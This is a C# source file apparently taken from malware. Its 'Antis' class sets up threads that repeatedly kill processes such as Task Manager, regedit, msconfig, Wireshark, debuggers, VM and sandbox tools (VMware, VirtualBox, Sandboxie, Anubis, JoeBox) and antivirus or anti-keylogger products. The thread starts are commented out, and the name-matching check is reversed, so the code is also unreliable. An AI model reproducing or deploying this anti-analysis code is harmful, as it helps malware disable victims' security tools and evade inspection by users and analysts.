using System;

public class Antis
{
    public static bool A()
    {
        try
        {
            System.Threading.Thread B1 = new System.Threading.Thread(B);
            //B1.Start();
            System.Threading.Thread C1 = new System.Threading.Thread(C);
            //C1.Start();
            System.Threading.Thread D1 = new System.Threading.Thread(D);
            //D1.Start();
            System.Threading.Thread E1 = new System.Threading.Thread(E);
            //E1.Start();
            System.Threading.Thread F1 = new System.Threading.Thread(F);
            //F1.Start();
            System.Threading.Thread G1 = new System.Threading.Thread(G);
            //G1.Start();
            System.Threading.Thread H1 = new System.Threading.Thread(H);
            //H1.Start();
            System.Threading.Thread I1 = new System.Threading.Thread(I);
            //I1.Start();
            System.Threading.Thread J1 = new System.Threading.Thread(J);
            //J1.Start();
            System.Threading.Thread K1 = new System.Threading.Thread(K);
            //K1.Start();
            System.Threading.Thread L1 = new System.Threading.Thread(L);
            //L1.Start();
            System.Threading.Thread M1 = new System.Threading.Thread(M);
            //M1.Start();
            System.Threading.Thread N1 = new System.Threading.Thread(N);
            //N1.Start();
            System.Threading.Thread O1 = new System.Threading.Thread(O);
            //O1.Start();
            System.Threading.Thread P1 = new System.Threading.Thread(P);
            //P1.Start();
            System.Threading.Thread Q1 = new System.Threading.Thread(Q);
            //Q1.Start();
            System.Threading.Thread R1 = new System.Threading.Thread(R);
            //R1.Start();
            System.Threading.Thread S1 = new System.Threading.Thread(S);
            //S1.Start();
            System.Threading.Thread T1 = new System.Threading.Thread(T);
            //T1.Start();
            //FolderOptions
            return true;
        }
        catch { return false; }
    }
    public static void B() { Killer("taskmgr");}
    public static void C() { Killer("regedit"); }
    public static void D() { Killer("msconfig"); }
    public static void E() { Killer("notepad"); }
    public static void F() { Killer("dxdiag"); }
    public static void G() { Killer("wireshark"); }
    public static void H() { Killer("mbam"); }
    public static void I() { Killer("vmware"); }
    public static void J() { Killer("ollydbg"); }
    public static void K() { Killer("virtualbox"); }
    public static void L() { Killer("hijackthis"); }
    public static void M() { Killer("sandboxie"); }
    public static void N() { Killer("anubis"); }
    public static void O() { Killer("anubis 2"); }
    public static void P() { Killer("keyscrambler"); }
    public static void Q() { Killer("panda"); }
    public static void R() { Killer("wine"); }
    public static void S() { Killer("outpost"); }
    public static void T() { Killer("joebox"); }
    public static bool Killer(string a)
    {
        try
        {
            while (true)
            {
                foreach (System.Diagnostics.Process p in System.Diagnostics.Process.GetProcesses())
                { if (a.Contains(p.ProcessName)){ p.Kill(); } System.Threading.Thread.Sleep(1); }
            }
        }
        catch { return false;}
    }
}